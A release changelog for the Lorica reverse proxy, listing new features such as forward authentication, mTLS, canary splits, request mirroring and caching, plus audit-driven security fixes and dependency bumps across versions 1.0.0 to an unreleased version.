- `lorica-command` pipelined RPC framework (WPAR worker-parity audit, Phase 1): new `RpcEndpoint` demultiplexes concurrent in-flight requests on a single Unix socket via a background reader task and a per-sequence in-flight map, with a bounded outbound queue (capacity 256) that backpressures through a per-request timeout rather than growing unbounded. In-flight entries are removed on every exit path (Ok, Closed, Timeout) so dead senders cannot linger. Adds an `Envelope` wire frame that carries either a `Command` or a `Response` (required because the two shared leading prost tags), new `CommandType` variants for the upcoming WPAR RPCs (`RateLimitQuery/Delta`, `VerdictLookup/Push`, `BreakerQuery/Report`, `ConfigReloadPrepare/Commit`), typed payload oneofs on `Command` and `Response`, tri-state `BreakerDecision` (`Allow`/`Deny`/`AllowProbe`) per the supervisor-owned HalfOpen-probe model, a `Coalescer<K,V>` dedup primitive with TTL-bounded caching for the upcoming `/metrics` fan-out, and a `GenerationGate` atomic watermark enforcing strictly increasing reload generations. 37 unit tests including concurrency, adjacent-request isolation, peer-drop cleanup, and high-volume pipelining. See `docs/architecture/worker-shared-state.md` § 4
- Connection pre-filter: IP allow/deny CIDR policy enforced at TCP accept, before TLS handshake. Configurable via new `connection_allow_cidrs` and `connection_deny_cidrs` `GlobalSettings` fields; editable in the dashboard Settings tab. Deny always wins; a non-empty allow list switches the filter to default-deny. Hot-reloaded via arc-swap - listener-state stays consistent without rebuilding endpoints, in both single-process and worker modes
- Cache predictor: shared 16-shard LRU (32K keys total) remembers cache keys whose origin responded uncacheable (OriginNotCache, ResponseTooLarge, or user-defined custom reason) and short-circuits the cache state machine on the next request. Reduces cache-lock contention and variance-key computation on known-bypass traffic. Transient errors (InternalError, UpstreamError, storage failures, lock timeouts) are not remembered
- Cache Vary support: per-route `cache_vary_headers` partition the cache by request header values (e.g. Accept-Encoding, Accept-Language) so different clients get separate cache entries under the same URL. Merged with the origin's `Vary` response header so both operator config and RFC 7234 semantics take effect. `Vary: *` anchors the variance on the request URI to keep cache cardinality bounded. Editable in the dashboard Caching tab. Schema migration V25 adds the column with a default of `[]`
- Header-based routing: per-route `header_rules` select a specific backend group based on a request header's value. Supports Exact, Prefix and Regex match types with regex compiled once per route at load time (a malformed regex disables only that rule, never the whole route; the dashboard flags disabled rules with a red badge so operators can republish). Evaluated before path rules so a path rule with its own `backend_ids` can still override. Enables A/B testing (`X-Version: beta`), multi-tenant routing (`X-Tenant: acme`), and similar content-negotiation patterns without touching upstream URLs. New dashboard Header Rules tab. Schema migration V26 adds the column with a default of `[]`
- Canary traffic split: per-route `traffic_splits` send a configurable percentage of requests to alternate backend groups. Assignment is sticky per client IP via a deterministic hash of `(route_id, client_ip)`, so a given user stays on the same version across requests on the same route. Splits are evaluated AFTER header rules (explicit opt-in wins) and BEFORE path rules (URL-specific overrides still win). Dangling backend IDs are logged at load time but consume their weight band (falling back to route defaults) rather than silently rebalancing traffic to the next split. API rejects weight > 100 or cumulative > 100, and non-zero weight with empty backends. New dashboard Canary tab with total-weight summary. Schema migration V27
- Forward authentication: per-route `forward_auth` gates every request through an external authentication service (Authelia, Authentik, Keycloak, oauth2-proxy) before reaching the upstream. The standard `X-Forwarded-*` header set (Method, Proto, Host, Uri, For) plus Cookie, Authorization and User-Agent are sent verbatim to the auth service; 2xx returns allow the request (optional `response_headers` are harvested and injected into the upstream, e.g. `Remote-User`); 401/403/3xx responses are forwarded to the client verbatim (critical for Authelia's login-redirect flow); timeout or connection failure fails closed with 503. Evaluated after route match and WAF but before any backend selection so denied requests never touch the upstream. API validates URL scheme (http/https), host presence, timeout range (1..60000 ms), and non-empty response-header names; a warn log fires when the scheme is `http://` and the host isn't loopback so operators know credentials will traverse cleartext. Optional per-route verdict cache via `verdict_cache_ttl_ms` (default 0 = off, API-capped at 60 s): `Allow` verdicts are cached keyed on the NUL-separated `{route_id}\0{cookie}` literal (no truncated-hash collision surface), honors the auth service's `Cache-Control: no-store` / `no-cache` directives, 16 384-entry bounded FIFO so a cookie-flood attack can't exhaust memory. `Deny` / `FailClosed` are never cached. Dashboard exposure in the Security tab. Schema migration V28
- Request mirroring (shadow testing): per-route `mirror` duplicates requests to one or more secondary backends for A/B validation and shadow testing. Fire-and-forget via a shared reqwest client with redirects disabled and a 256-slot global concurrency semaphore - a saturated or dead shadow never impacts the primary request. Sampling is deterministic per `X-Request-Id` so retries of the same request land on the same mirror decision. Mirror requests carry `X-Lorica-Mirror: 1` so shadow backends can filter the traffic from their own metrics. Request bodies on POST/PUT/PATCH are forwarded in full up to a configurable `max_body_bytes` cap (default 1 MiB, max 128 MiB, 0 = headers-only); requests whose body exceeds the cap are sent to the primary normally but skipped for mirroring (a truncated body would mislead the shadow). Trust model: shadow backends receive Cookie / Authorization / session headers verbatim (matching Nginx `mirror`, Traefik `Mirroring`, Envoy `request_mirror_policies`), so shadows must be deployed in the same trust boundary as the primary - the `X-Lorica-Mirror: 1` marker is for log/metric filtering, not a security boundary. API validates non-empty/deduplicated backend list, sample_percent 0..=100, timeout 1..60000 ms, and max_body_bytes ceiling. Dashboard exposure in the Security tab. Schema migration V29
- Stale-while-revalidate background refresh: when a cached entry is past its TTL but within the route's `stale_while_revalidate_s` window, the proxy now serves the stale body to the client immediately and spawns a background sub-request that fetches fresh content from the upstream, updates the cache, and releases the write lock. The next request sees the refreshed entry without a round-trip. Built on Pingora's `SubrequestSpawner` + the existing cache-lock infrastructure; `response_cache_filter` already emits the SWR/SIE durations on the `CacheMeta`. Past the SWR window, stale hits fall back to synchronous revalidation as before
- Response body rewriting (Nginx `sub_filter` equivalent): per-route `response_rewrite` applies an ordered list of search-and-replace rules to upstream response bodies before they reach the client. Supports literal patterns (default) and regex with capture-group substitution (`$1`, `$2`). Rules compose (each rule runs on the output of the previous one). Only text-ish content is rewritten - configurable `content_type_prefixes` (default `text/`); compressed responses (`Content-Encoding: gzip/br`) pass through unchanged to avoid corrupting the stream. Bodies exceeding `max_body_bytes` (default 1 MiB, cap 128 MiB) stream through verbatim rather than emit a partial rewrite. Cross-chunk patterns are caught because the engine buffers the full body before running rules. `Content-Length` is automatically dropped on rewritten responses (new length differs from origin). API validates regex compilability at write time, non-empty patterns, and bounded limits. Schema migration V30 adds `routes.response_rewrite TEXT` as nullable JSON. Dashboard: dedicated "Rewrite" tab with per-rule reorder/expand UX. HEAD responses, 1xx/204/304 statuses, and cache-enabled routes are skipped (the last is mutually exclusive with rewriting in v1 and is surfaced via a warn log)
- mTLS client verification: per-route `mtls` requires connecting clients to present an X.509 certificate signed by the configured CA bundle and, optionally, constrains which certificate subject organizations are allowed. The TLS handshake verifier is built at listener startup from the union of all per-route CAs (via rustls `WebPkiClientVerifier` with `allow_unauthenticated`), so different routes on the same listener can have different policies. Per-request enforcement runs before forward_auth: `required = true` with no client cert returns 496 ("SSL certificate required"), a presented cert whose O= isn't in `allowed_organizations` returns 495 ("SSL certificate error"). Rustls `ServerConfig` is immutable after build, so changes to `ca_cert_pem` require a restart; toggling `required` and editing `allowed_organizations` hot-reload. API validates PEM decodability, presence of at least one CERTIFICATE block, X.509 DER integrity, a 1 MiB bundle cap, and dedup/non-empty entries in the organization allowlist. Schema migration V31 adds `routes.mtls TEXT` as nullable JSON. Dashboard exposure in the Security tab
- Prometheus counters for every v1.3.0 feature with non-trivial activity, exposed on the existing `GET /metrics` endpoint: `lorica_cache_predictor_bypass_total{route_id}`, `lorica_header_rule_match_total{route_id, rule_index}` (with `rule_index = "default"` for fallthrough), `lorica_canary_split_selected_total{route_id, split_name}` (with `"default"` / `"unnamed"` labels), `lorica_mirror_outcome_total{route_id, outcome}` (outcomes: `spawned`, `dropped_saturated`, `dropped_oversize_body`, `errored`), `lorica_forward_auth_cache_total{route_id, outcome}` (outcomes: `hit`, `miss`). Cardinality is bounded by route count - no user-input-derived labels
- Supervisor -> worker pipelined-RPC Prometheus counter (`lorica_supervisor_rpc_outcome_total{kind, outcome}`): one counter spanning `metrics_pull` / `config_reload_{prepare,commit,abort}` with `ok` / `timeout` / `error` outcomes. Lets ops tell apart "all workers slow on Prepare" (DB contention) from "one worker stuck on metrics pull" (downstream issue)
- Config-validation endpoints to shorten the save-fail-retry loop when configuring auth and mTLS: `POST /api/v1/validate/mtls-pem` parses a candidate CA PEM and returns the per-cert subjects so operators can confirm their bundle before committing; `POST /api/v1/validate/forward-auth` issues one GET to a candidate auth URL and reports status, elapsed time, and a whitelisted subset of response headers (Location, Remote-User, Remote-Groups, Remote-Email, Content-Type). Surfaced in the dashboard Security tab as inline "Validate PEM" / "Test connection" buttons

### Changed

- `sla_purge_enabled` global setting now defaults to `true` (was `false`). Bounds disk usage out of the box: the existing `sla_purge_retention_days` (90 days) and `sla_purge_schedule` ("first_of_month") apply automatically on fresh installs. Operators who need full SLA history can opt out via the dashboard Settings tab. Existing installations keep their stored value; only fresh installs and configs that omit the field pick up the new default
- Circuit breaker now scopes state by `(route_id, backend)` instead of by backend alone. Two routes that share the same upstream IP:port (common when a single Teleport / nginx front-door multiplexes several virtual hosts on one port) no longer punish each other: failures on one route open the breaker only for that route, leaving sibling routes routable to the same physical backend
- Response body rewriting: compiled rules are now resolved once in `response_filter` and stored on the per-request context, replacing a linear scan of all routes that previously ran on every body chunk. Per-chunk overhead is a pointer clone regardless of route count
- Basic auth credential cache keys are now the raw NUL-joined `"{credential}\0{hash}"` string instead of a 64-bit `DefaultHasher` digest. Two distinct credentials can no longer collide on a truncated hash and share a cache slot (same design as the forward auth verdict cache)
- Forward auth `X-Forwarded-Proto` is now derived from the TLS socket state (`ssl_digest`) instead of HTTP version. h2c (HTTP/2 over plaintext) would previously be reported as `https` to the auth service
- `canary_bucket` now uses FNV-1a with fixed constants instead of `DefaultHasher` (which seeds a random `RandomState` per process). Canary assignments are now stable across restarts and rolling upgrades: the same client IP lands on the same bucket on the new process as on the old one, so a rollout does not silently reshuffle which users see the canary
- `RouteEntry` is now stored as `Arc<RouteEntry>` in `ProxyConfig` and the matched entry is cached in the per-request context during `request_filter`. `upstream_peer` no longer re-runs `find_route` on the same request; the entry is reused as a pointer clone
- Canary / header-rule / path-rule overrides remain strictly fail-closed when all of their backends are breaker-open or unhealthy (502 rather than fallback to route defaults). Documented explicitly in `upstream_peer` so operators know a bad canary surfaces as a visible error on the fraction of traffic routed to it, not as silent absorption by the primary
- Email notification channel update: the masked-password restore path now rejects the request with a clear error when the stored config is missing, unparseable, or carries no `smtp_password`. Prior code silently fell through and persisted the literal `"********"` mask back to the database, erasing the real SMTP password
- Custom WAF rule compilation now caps both the raw pattern length (4 KiB) and the compiled NFA/DFA size (512 KiB) via `RegexBuilder::size_limit`. An authenticated admin submitting a pathological alternation can no longer stall the management API thread or balloon memory during hot-reload. Runtime matching was already linear via the `regex` crate; this closes the compile-time surface
- Pinned `rustls-pemfile = "=2.1.2"` in `lorica` and `lorica-tls` to keep the workspace off the 2.2.0 line flagged unmaintained by RustSec (RUSTSEC-2025-0134). The unmaintained API is not used; pinning is precautionary while rustls upstream lands the in-tree replacement
- E2E Docker harness (`tests-e2e-docker/`) now runs as the non-root `lorica` user end-to-end. The entrypoints no longer need `su` to drop privileges because the exposed ports (9443/8080/8443) are above 1024 and `CAP_NET_BIND_SERVICE` is not required
- Bumped `dashmap 5.5.3 -> 6.1.0` across `lorica`, `lorica-api`, `lorica-limits`; 5.x had iterator-invariant unsoundness fixed in 6.x (supply-chain audit SC-M-1, SC-M-4)
- Bumped `tokio-tungstenite 0.20.1 -> 0.29.0` in `lorica-proxy` to drop a duplicated websocket frame parser and pull in fuzzer-driven fixes (supply-chain audit SC-M-2)
- Bumped `brotli 3 -> 8` in `lorica-core` (supply-chain audit SC-L-1); API source-compatible for Lorica's `CompressorWriter` / `DecompressorWriter` usage
- `lorica-api` feature `route53` flipped to off by default (supply-chain audit SC-M-3). Non-Route53 deployments no longer ship the `aws-smithy-http-client` dep graph that drags `rustls 0.21` + `hyper 0.14`. Users of ACME DNS-01 via Route53 build with `cargo build --release --features route53`. BREAKING for downstream packagers who relied on the default feature
- Inlined `no_debug` (was `no_debug = "3.1.0"` unmaintained single-file crate, supply-chain audit SC-L-3) as `lorica-tls::no_debug` module. Dropped the dep; public API preserved via `pub use crate::no_debug::{...}`
- Dropped `daemonize = "0.5"` dep (RUSTSEC-2025-0069, unmaintained). Production Lorica runs under `systemd Type=simple`; legacy `--daemon` flag now emits a warning and falls through to foreground execution. BREAKING only for operators who relied on `--daemon` outside systemd (a non-use-case in practice)
- CI: new `Semgrep (security)` job running 7 `p/*` rulesets + `trailofbits/semgrep-rules` (generic / javascript / rs / yaml), non-blocking with SARIF upload as PR artifact. Closes the original `p/bash` / `p/yaml` / `p/sql` coverage gap (audit round 1 identified them as 404 on the registry)
- CI: new `Frontend lint` step running `svelte-check` + `eslint-plugin-svelte` (flat config with `svelte/no-at-html-tags` + `svelte/no-target-blank` + `no-eval` family). Regression guard for the Svelte XSS manual audit pass (audit coverage gap)
- Split `lorica/src/proxy_wiring.rs` from 8 561 LOC down to 4 170 LOC (-51 %) as audit M-8 follow-up. Tests block (~3 k LOC) moved to `proxy_wiring/tests.rs`; RPC dispatch enums (BreakerAdmission / BreakerEngine / VerdictCacheEngine / RateLimitEngine) moved to `proxy_wiring/engines.rs`; forward-auth + verdict-cache to `proxy_wiring/forward_auth.rs`; mirror + response-rewrite to `proxy_wiring/mirror_rewrite.rs`; pure helpers (sanitize_html, mTLS, canary, cache vary, header rules) to `proxy_wiring/helpers.rs`. All re-exported via `pub use` so the existing `lorica::proxy_wiring::*` import path is preserved. No functional change

### Fixed

- Worker auto-respawn race during supervisor shutdown: the worker monitor task (which detects crashed workers and respawns them) blocks on a `std::sync::Mutex` shared with the supervisor's shutdown path. `monitor_handle.abort()` cannot fire while the monitor is parked on that mutex (abort only takes effect at the next `.await`), and `manager.shutdown_all()` holds the mutex synchronously for the full ~30 s drain. When `shutdown_all` releases the mutex after SIGKILL'ing stragglers, the monitor unblocks, sees those workers as crashed, and respawns them BEFORE reaching the loop's next `sleep().await` cancellation point. The freshly forked workers get SIGTERM ms later, can't drain in time, and systemd ends up SIGKILL'ing the whole service group past `TimeoutStopSec`. Fix: introduce a `shutting_down` `AtomicBool`. The supervisor sets it before `shutdown_all` (and still calls `monitor_handle.abort()` as a backstop). The monitor checks the flag both before and after acquiring the mutex; on the post-acquire check it returns early without restarting any worker, regardless of how long it waited for the mutex
- Worker RPC listener hang on supervisor shutdown: `RpcEndpoint::Inner::drop` did not actually abort the reader + writer tokio tasks (dropping a `JoinHandle` is detach, not abort), so a dropped endpoint kept its socket halves alive and the peer never saw EOF. Worker shutdown then hung past the 10 s `TaskTracker` drain. Fix: `Inner::drop` now calls `handle.abort()` on both tasks. Regression test `reload_listener_drains_on_supervisor_eof` asserts completion within 5 s
- `SupervisorBreakerRegistry` stale-probe deadlock (audit H-1): if the probe-admitted worker crashed between admit and report, the breaker entry was pinned in `HalfOpen { probe_in_flight: true }` forever and every subsequent query for that `(route, backend)` returned Deny until supervisor restart. `HalfOpen` now carries `probe_started_at: Option<Instant>`; on the next query observing `elapsed >= cooldown` the supervisor synthesises a failed probe, bumps the failure counter, transitions back to Open with a fresh cooldown, and emits a warn log. Regression test `breaker_registry_stale_probe_recovers_after_cooldown`
- `lorica-worker::fd_passing::recv_worker_fds` kernel-FD leak on error paths (audit H-2): the function collected raw `RawFd`s into a `Vec` and returned `Err(...)` on UTF-8 validation / fds-tokens mismatch / bad `FdKind` token without closing them. Received FDs are now wrapped in `OwnedFd` immediately after `recvmsg` so every error path `close(2)`s via the RAII drop. Added `MSG_TRUNC` / `MSG_CTRUNC` detection so silent kernel truncation returns `InvalidPayload` instead of adopting a half-received FD set. Added a compile-time size assertion on `PAYLOAD_BUF_SIZE`
- Two-phase config reload non-atomic `connection_filter` publish (audit H-3): `PendingProxyConfig` now carries the full `reload::PreparedReload` rather than only `Arc<ProxyConfig>`, so the Commit handler calls `commit_prepared_reload(proxy_config, filter, prepared)` which publishes the ArcSwap and the filter CIDR reload together. Prior code re-read the filter separately, opening a short window where ProxyConfig v2 ran against filter v1 on reloads that flipped `connection_allow_cidrs` / `connection_deny_cidrs`. The worker-side RPC listener is now wired with `Some(connection_filter)` at the call site (was `None`)
- `EwmaTracker::record` hot-path allocation (audit M-1): the common case (backend already known) no longer pays for an `addr.to_string()` per request. `get_mut` path + first-sample seeding without the 30 % alpha bias
- TOCTOU in `SupervisorVerdictCache::lookup` + `FORWARD_AUTH_VERDICT_CACHE` expiry eviction (audit M-2 + M-3): a concurrent fresh insert racing with an expiry observation could be evicted by the stale lookup. Replaced with `dashmap::DashMap::remove_if` that evicts only when the entry's `expires_at` still matches the observation
- `handle_rate_limit_delta` mutex contention on first-seen keys (audit M-4): N concurrent `RateLimitDelta` RPCs on a first-seen `{route|scope}` previously serialised on the `store` `tokio::Mutex` for N SQLite reads. Added a supervisor-side `rl_policy_cache` DashMap that caches per-route policy, invalidated on every reload (both the fully-succeeded two-phase commit and the legacy-broadcast fallback)
- Predictable `generate_request_id` IDs (audit M-5): previous implementation used `DefaultHasher(SystemTime::nanos XOR thread_id)`, which is deterministic given inputs and collides on same-nanosecond concurrent same-thread requests. Replaced with `OsRng.fill_bytes(16)` for 128 bits of unpredictable ID
- `ConfigReloadAbort` RPC (audit M-7): new wire-additive `CommandType::ConfigReloadAbort` (tag 14) fanned out to workers that succeeded Prepare when a peer fails; worker drops the pending slot on generation match instead of pinning one orphan `Arc<ProxyConfig>` per worker until the next reload
- `lorica-shmem::now_ns` silent fallback (audit L-1): `clock_gettime` failure now emits a warn log instead of silently returning 0, which would stall eviction without any signal to ops
- `lorica-command::IncomingCommand::reply` debug-assert on caller-supplied sequence mismatch (audit L-3): release builds still overwrite with the originating command's sequence, but wiring bugs that pass a different non-zero sequence now surface in tests
- `generate_random_password` deterministic RNG (audit L-5): replaced `thread_rng()` with `ChaCha20Rng::from_rng(OsRng)` so the first-run admin password pedigree matches `hash_password`'s OS-entropy salt
- `lorica-limits::token_bucket::refill_locked` overflow-defence tightening (audit L-6): added a `debug_assert!` that `refill_per_sec <= 1_000_000` (the API cap) so future regressions surface in tests instead of silently saturating


## [1.2.0] - 2026-04-11

### Added

- Cache lock for thundering herd protection: only one request fetches from upstream on cache miss, others wait for the cached response (10 s timeout)
- Stale-while-error: serve cached responses when upstream fails (60 s) and during background revalidation (10 s), via `should_serve_stale()` hook
- Cache PURGE method: HTTP PURGE requests invalidate cached entries matching the request URI
- gRPC-Web bridge module: transparently converts HTTP/1.1 gRPC-web requests to HTTP/2 gRPC for upstream backends
- Least Connections load balancing algorithm: routes traffic to the backend with the fewest active connections
- HTTP Basic Auth per route: username/password (Argon2id-hashed) with 401 + WWW-Authenticate challenge. Configurable in Security tab
- Maintenance mode per route: returns 503 with Retry-After header and optional custom HTML error page
- Custom error pages: configurable HTML template for upstream errors (502/504) with `{{status}}` and `{{message}}` placeholders, served via `fail_to_proxy()` hook
- Enriched retry policy: `retry_on_methods` field filters which HTTP methods are eligible for retry (e.g. GET, HEAD only), preventing duplicate side-effects on POST/PUT
- Structured log output: `--log-format` CLI option (json/text) and `--log-file` for file output alongside stdout. Propagated to worker processes
- OCSP stapling: automatic OCSP response fetch from CA responder (AIA extension), attached to TLS handshakes via rustls CertifiedKey. Best-effort with warning on failure
- Production Dockerfile: multi-stage build (Node 22 + Rust + Debian slim), non-root user, volume mount at /var/lib/lorica
- Per-route stale cache configuration: `stale_while_revalidate_s` (default 10) and `stale_if_error_s` (default 60) configurable via API and dashboard Caching tab

### Security

- PURGE method restricted to loopback and trusted proxy CIDRs to prevent external cache invalidation
- HTML escape for `{{message}}` placeholder in custom error pages to prevent XSS via crafted upstream error messages
- Basic auth credential verification cache (60 s TTL) avoids Argon2 hot-path overhead on repeated requests

### Changed

- Route struct wrapped in Arc in ProxyConfig to avoid deep-cloning on every request (~300-500ns saved)
- Path rewrite regex wrapped in Arc to avoid compiled NFA/DFA duplication per request
- WAF rule matching uses single `find()` instead of `is_match()` + `find()` (halves regex cost on matches)
- WAF `url_decode` fast path skips decode loop when input has no percent-encoding
- HTML sanitize regexes compiled once at startup via `Lazy<Regex>` instead of per-call

### Fixed

- Per-route IP allowlist/denylist CIDR matching was using string prefix comparison (`starts_with`), which incorrectly matched `10.1.2.3` against `10.1.2.30/24`. Now uses proper network containment via ipnet
- WAF event category filter: filter now applied at SQL level so LIMIT returns correct results when filtering by category (e.g. XSS events were invisible when IP Blocklist dominated the top N rows)
- list_routes() SELECT was missing stale_while_revalidate_s, stale_if_error_s, and retry_on_methods columns, causing maintenance_mode and other v1.2.0 fields to read incorrect values from shifted column indices
- Frontend TypeScript types synchronized with Rust API: WafEvent (route_hostname, action), ProxyInfo (http_port, https_port), GlobalSettings (waf_whitelist_ips), route-form test fixture (v1.2.0 fields)
- Supervisor mutex poison recovery: worker monitor and shutdown no longer panic on poisoned mutex, recover gracefully with warning log
- Encryption key load failure now logs an explicit error instead of silently falling back to unencrypted storage
- Dashboard accessibility: all dialog overlays have Escape key handler, aria-modal, tabindex; all sortable table headers have keyboard Enter handler and role="button"; backdrop has role="presentation"
- Prometheus metric creation uses `expect()` instead of `unwrap()` for better startup diagnostics
- `log_store.rs` `copy_to_sql` handles conversion errors gracefully instead of panicking
- SLA CSV export response builder uses `expect()` instead of `unwrap()`

## [1.1.0] - 2026-04-10

### Added

- Global WAF whitelist IPs in Settings: IPs or CIDRs that bypass WAF evaluation, rate limiting, IP blocklist, and auto-ban entirely. Prevents operators from being auto-banned by false positives (e.g. CMS body content triggering path traversal rules)
- CLI `lorica unban <IP> --password <PASSWORD>` command for emergency IP removal when locked out of the dashboard
- Access logs: configurable entry limit (100/500/1K/5K/10K) and "X of Y entries" total count display
- 12 new WAF rules (49 total): SQLi auth bypass, info schema recon, encoding evasion, NoSQL injection (MongoDB), XSS eval/base64, backup file access, PowerShell/Windows commands, HTTP request smuggling, scanner detection, PHP/Java deserialization, HTTP method abuse
- X-Request-Id header: unique request identifier generated per request, propagated to backends and logged in access logs for end-to-end tracing
- Circuit breaker: per-backend failure tracking that removes backends from rotation after 5 consecutive errors (5xx or connection failures), with 10s cooldown and half-open probe before recovery
- Sticky sessions: cookie-based session affinity per route. When enabled, a `LORICA_SRV` cookie containing the backend ID is set on first request. Subsequent requests are routed to the same backend. Falls back to normal load balancing if the backend is down

### Fixed

- Duplicate access log entries in worker mode: workers now persist logs directly, supervisor only pushes to in-memory buffer for WebSocket streaming
- WAF body scanning false positives: path traversal (930xxx) and protocol violation (920xxx) rules are no longer applied to request bodies, preventing false positives on CMS content containing `..\ ` or similar text
- SLA metrics polluted by proxy-level rejections and connection errors: WAF blocks, bans, rate limits, return_status responses, and upstream/downstream errors (resets, timeouts) are excluded from SLA latency percentiles
- SLA breach notifications not firing in worker mode: supervisor now checks thresholds on every flush cycle regardless of local data, reading SLA metrics flushed by workers
- Access logs: disabling auto-refresh/live toggle did not disconnect WebSocket, choice not persisted across page reloads
- IP blocklist WAF events showing `-` as route when request has no Host header: now falls back to URI authority (IP:port)
- Security page: missing category labels (SSRF, XXE, SSTI, Log4Shell, IP Blocklist, Prototype Pollution) and event filter options
- Client H2 disconnects ("not a result of an error") no longer shown as errors in access logs - status 0 is sufficient
- TCP keepalive on upstream connections (idle 15s, interval 5s, 3 probes) to detect stale/half-closed pooled connections before reuse
- Upstream idle connection timeout (60s) evicts stale connections from the pool
- Upstream keepalive pool auto-sizing at startup: 128 for <= 15 backends, scales to 8 per backend up to 1024 max

## [1.0.0] - 2026-04-09

### Added

**Proxy Engine**

- HTTP/HTTPS reverse proxy built on Cloudflare Pingora with host-based and path-prefix routing, TLS termination via rustls, structured JSON access logging, and configuration hot-reload via arc-swap
- Path rules: ordered sub-path overrides within a route for backends, cache, headers, rate limits, or direct HTTP status responses. First match wins with prefix and exact match types
- Route `redirect_to` field for 301 redirects (www-to-non-www, domain migrations) with automatic path and query string preservation
- Route `return_status` field for direct HTTP status responses (e.g. 403, 404) without proxying
- Catch-all hostname `_` as last-resort fallback when no exact or wildcard match is found
- Path rewriting with strip/add prefix and regex capture groups (linear time, ReDoS-safe)
- Per-backend `h2_upstream` toggle for HTTP/2 upstream (h2c plaintext, ALPN h2 for TLS) enabling gRPC proxying
- Round-robin, Peak EWMA, Consistent Hash, and Random load balancing strategies per route
- Configurable proxy headers, response headers, per-route timeouts, WebSocket passthrough, hostname aliases, force HTTPS redirect, per-route gzip compression and retry attempts
- X-Forwarded-Proto detection via TLS session digest
- SO_REUSEPORT on all proxy listeners for kernel-level connection distribution
- Connection pooling with health-aware backend filtering
- Cookie merge support for upstream responses

**Security**

- WAF engine with 39 OWASP CRS-inspired rules: SQLi, XSS, path traversal, command injection, SSRF (cloud metadata, localhost, internal networks, dangerous URI schemes), Log4Shell/JNDI, XXE, CRLF injection. Detection or blocking mode. Sub-0.5ms evaluation latency
- Custom WAF rules persisted in SQLite, configurable per-rule enable/disable at runtime
- IP blocklist auto-fetched from Data-Shield IPv4 Blocklist (~80,000 entries, O(1) lookup, refreshed every 6h)
- Per-route rate limiting with configurable RPS, burst tolerance, and proper `X-RateLimit-*` response headers
- Auto-ban for IPs exceeding rate limits (configurable threshold and duration), with global supervisor-aggregated counters in multi-worker mode
- Trusted proxies CIDR list for X-Forwarded-For validation, preventing IP spoofing via header injection
- Per-route max connections (503 rejection), global connection limit, adaptive flood defense (auto-halves rate limits under flood)
- Slowloris detection with configurable threshold (408 rejection)
- Security header presets (strict/moderate/none) with custom preset support, IP allowlist/denylist, CORS per route
- Encrypted notification configs and certificate private keys at rest (AES-256-GCM)
- Database file permissions restricted to 0600, encryption key file created atomically with 0600 permissions
- Redacted password hashes in config export; import rejects redacted hashes
- Explicit Argon2id parameters (OWASP-compliant) for password hashing and verification
- Maximum password length (128 chars) to prevent DoS via large Argon2 inputs
- Session invalidation on password change (all sessions except current)
- Per-IP login rate limiting (was global bucket)
- CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy headers on dashboard
- Recursive URL decoding in WAF (max 3 passes) to prevent double-encoding bypass
- WAF request body scanning for SQL injection, XSS, and command injection in POST data (text bodies up to 1 MB, binary payloads skipped)
- DNS server parameter validation before shell command execution
- 10 MB global API request body size limit
- `#![deny(unsafe_code)]` on pure-logic crates (waf, config, notify, bench, api)
- `cargo-deny` configuration for supply chain auditing
- Empty SNI validates full certificate chain (CA, expiration, revocation)
- Load test target URL restricted to localhost to prevent external attacks
- HTTP request smuggling protections tested (CL.TE desync, TE obfuscation, duplicate CL)
- CRL (Certificate Revocation List) support for upstream TLS via `--upstream-crl-file` with automatic hot-reload every 60s

**TLS & Certificates**

- ACME HTTP-01 automatic provisioning via instant-acme with challenges served on proxy port 80
- ACME DNS-01 automatic provisioning with Cloudflare, Route53 (AWS SDK), and OVH providers
- ACME DNS-01 manual mode (two-step flow for any DNS provider)
- Multi-domain SAN and wildcard certificate support for DNS-01 flows
- Global DNS providers: credentials configured once in Settings, referenced by ID during provisioning
- Smart auto-renewal: certificates remember their provisioning method and DNS credentials, renewing automatically every 12h (30 days before expiry). Manual DNS-01 certificates skipped
- Background certificate expiry check every 12h with CertExpiring notifications at configurable warning/critical thresholds
- SNI-based certificate hot-swap via arc-swap with wildcard support (`*.example.com`)
- Certificate upload parses X.509 metadata (issuer, validity, SAN domains, fingerprint)
- Encryption key rotation via `lorica rotate-key --new-key-file` CLI command
- TLS termination in worker mode with per-worker CertResolver loaded from DB
- HTTPS listener starts unconditionally; TLS works as soon as the first cert is uploaded

**Dashboard**

- Embedded Svelte 5 + TypeScript frontend (~59 KB gzipped) compiled into the binary via rust-embed
- Overview cockpit with system health cards, setup checklist, section helpers with animated expand/collapse
- Routes CRUD with 25+ settings across 7 tabs, path rules tab with reorder and collapsible overrides
- Backends CRUD with address, weight, health check (TCP/HTTP), TLS upstream, HTTP/2 toggle, active connections
- Certificates management with ACME (HTTP-01, DNS-01) and manual upload, manual renewal button
- Security page with WAF event table, category filtering, 39 rule toggles, IP ban list with unban
- SLA page with passive/active side-by-side comparison, latency percentile tables, config editor, CSV/JSON export
- Load test page with config management, clone, one-click execution, real-time SSE progress, historical results with comparison
- Active probes CRUD with route selection and enable/disable toggle
- Access logs with real-time WebSocket streaming (green pulsing indicator), CSV/JSON export with date range picker
- System page with worker table (PID, health, heartbeat latency), CPU/memory/disk gauges
- Settings page with notification channels (structured forms per type), DNS providers, security header presets, config export/import with diff preview, getting started guide toggle
- Nginx config import wizard with path rules and certificate import support
- Notification form with structured fields per channel (SMTP, Webhook, Slack), alert type checkboxes, real test delivery via Test button
- Graceful error handling when backend is unreachable, auto-redirect to login on 401 session expiry
- Light/dark theme toggle, consistent full-width layout, CSS design-token variables

**Notifications**

- Notification system with 5 alert types: cert_expiring, backend_down, waf_alert, config_changed, ip_banned
- Four delivery channels: stdout (structured JSON), SMTP email (STARTTLS), HTTP webhook, Slack
- Per-channel rate limiting (sliding window), channel subscription filtering, event history (100 events)
- Notification history endpoint and dashboard table
- Hot-reload from database configs, broadcast-based AlertSender for proxy hot path

**Monitoring**

- Passive SLA monitoring from real traffic with lock-free atomic counters, time-bucketed aggregation, rolling windows (1h/24h/7d/30d), configurable success criteria
- Active SLA monitoring with synthetic HTTP probes (configurable method, path, status, interval, timeout)
- SLA threshold alerts with automatic notifications when passive SLA drops below target
- Built-in load testing with configurable concurrency, RPS, duration, safe limits, CPU circuit breaker (90%), cron scheduling, SSE streaming, config cloning
- Prometheus metrics at `/metrics`: request count, latency histograms, active connections, backend health, cert expiry, WAF events, system CPU/memory
- Worker metrics aggregation: cache hits/misses, active connections, ban list, EWMA scores from workers to supervisor

**Caching**

- HTTP response cache via Pingora MemCache with LRU eviction (128 MiB cap, TinyUFO algorithm)
- Per-route toggle with configurable TTL and max size, Cache-Control header respect, Authorization/Cookie bypass
